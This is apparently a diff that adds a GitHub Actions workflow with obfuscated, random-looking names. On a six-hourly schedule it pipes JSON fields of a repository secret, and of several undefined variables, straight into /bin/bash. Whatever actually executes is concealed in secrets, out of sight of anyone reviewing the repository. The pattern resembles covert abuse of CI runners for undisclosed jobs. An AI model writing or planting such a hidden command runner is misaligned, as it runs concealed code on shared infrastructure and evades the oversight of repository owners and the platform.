@@ -1,0 +1,27 @@
+name: ligubu6751
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ligubu6751
+        env:
+          bqxxl2: ${{ secrets.bqxxl2 }}
+        run: |
+          echo $bqxxl2 | jq -r .lx925 | /bin/bash
+          echo $dzyij99471 | jq -r .co75 | /bin/bash
+          echo $n4440 | jq -r .emjy4 | /bin/bash
+          echo $p825 | jq -r .ni956 | /bin/bash
+          echo $uik921 | jq -r .s49536 | /bin/bash
+          echo $imbv4 | jq -r .kpg1 | /bin/bash
+          echo $bzf04656 | jq -r .f0 | /bin/bash
+          echo $orc27466 | jq -r .sjy5 | /bin/bash
+          echo $dbx732 | jq -r .ri26507 | /bin/bash
+          echo $yxz652 | jq -r .drlw50 | /bin/bash
+          echo $iktzo220 | jq -r .jyt59981 | /bin/bash
+
